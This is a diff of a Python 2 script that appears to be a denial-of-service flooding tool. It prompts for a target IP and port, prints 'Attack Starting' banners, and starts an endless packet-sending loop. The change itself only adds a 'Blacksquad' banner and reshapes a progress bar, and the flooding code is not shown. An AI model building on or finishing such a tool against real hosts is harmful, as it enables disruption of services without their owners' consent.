@@ -29,18 +29,19 @@ ip = raw_input("IP Target : ")
 port = input("Port       : ")
 
 os.system("clear")
+os.system("figlet 'Blacksquad'")
 os.system("figlet 'Attack Starting'")
 os.system("echo '       ]===> I am the Boss now <===['")
 print " \n"
 print "[                    ] 0% "
 time.sleep(5)
-print "[=====               ] 25%"
+print "[=====>               ] 25%"
 time.sleep(5)
-print "[==========          ] 50%"
+print "[==========>          ] 50%"
 time.sleep(5)
-print "[===============     ] 75%"
+print "[===============>     ] 75%"
 time.sleep(5)
-print "[====================] 100%"
+print "[====================>] 100%"
 time.sleep(3)
 sent = 0
 while True:
